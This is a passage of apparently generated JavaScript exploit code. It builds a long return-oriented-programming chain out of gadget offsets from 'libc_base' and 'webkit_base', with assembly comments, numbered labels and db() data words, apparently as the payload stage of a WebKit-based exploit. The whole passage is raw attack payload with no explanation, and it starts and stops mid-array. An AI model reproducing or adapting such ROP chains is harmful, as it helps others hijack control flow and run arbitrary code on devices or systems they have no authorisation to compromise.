libc_base+764760, //pop rsi
ropchain+1119600, //L1832
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1119616, //L1833
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1119584, //L1831
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+346125, //setne al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1119688, //L1834
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1834:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1119816, //L1837
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1119832, //L1838
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1119800, //L1836
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1836:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1119976, //L1841
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1119992, //L1842
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1119960, //L1840
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+346125, //setne al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1120064, //L1843
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1843:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1120192, //L1846
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1120208, //L1847
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1120176, //L1845
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1845:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1120320, //L1849
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1120368, //L1852
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1120336, //L1850
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1850:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1120480, //L1853+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1120472, //L1853
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1120496, //L1853+24
ropchain+1122840, //L1848
libc_base+764760, //pop rsi
ropchain+1120552, //L1855
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1854:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1120640, //L1857
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1120656, //L1858
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1857:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1858:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1120816, //L1861
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1120848, //L1863
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1120800, //L1860
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1120832, //L1862
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1861:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1120928, //L1864
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1120944, //L1865
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1121104, //L1869
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1121056, //L1866
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1121072, //L1867
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1866:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1867:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1868:
db([56, 0]); // 0x38
set_gadget(libc_base+759608,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1121208, //L1871
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1121192, //L1870
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1121304, //L1873
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1872:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1121392, //L1875
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1121408, //L1876
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1875:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1876:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1121488, //L1878
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1121504, //L1879
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1121648, //L1882
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1121616, //L1880
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1121632, //L1881
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1121736, //L1884
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1121840, //L1886
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1885:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1886:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1121928, //L1888
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1121944, //L1889
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1888:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1889:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1122048, //L1892
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1122032, //L1891
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L1891:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1892:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1122104, //L1894
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1894:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1122224, //L1897
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1897:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1122280, //L1898
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1122424, //L1902
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1122392, //L1900
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1900:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1901:
db([56, 0]); // 0x38
set_gadget(libc_base+759608,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1122560, //L1904
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1122576, //L1905
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1122544, //L1903
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1122680, //L1906
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1122696, //L1907
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1122816, //L1908
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1122800, //L1909
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+782311, //pop rsp
ropchain+1124288, //L1910
//L1848:
libc_base+764760, //pop rsi
ropchain+1122896, //L1912
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1911:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L1912:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1122984, //L1914
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1123000, //L1915
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1914:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1915:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1123144, //L1919
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1123112, //L1917
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1123128, //L1918
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1123240, //L1921
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1920:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1921:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1123328, //L1923
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1123344, //L1924
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1923:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1924:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1123504, //L1927
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1123536, //L1929
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1123488, //L1926
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1123520, //L1928
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1927:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1123632, //L1931
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1123616, //L1930
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L1933:
ropchain+1123736, //L1932
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1124616, //L1934
//L1932:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1123880, //L1936
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1123896, //L1937
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1123864, //L1935
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1935:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1124024, //L1939
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1124040, //L1940
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1124008, //L1938
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1124144, //L1941
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1124160, //L1942
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1124280, //L1943
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1124264, //L1944
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1124368, //L1946
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1124352, //L1945
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1124472, //L1947
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1124488, //L1948
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1124608, //L1949
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1124592, //L1950
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
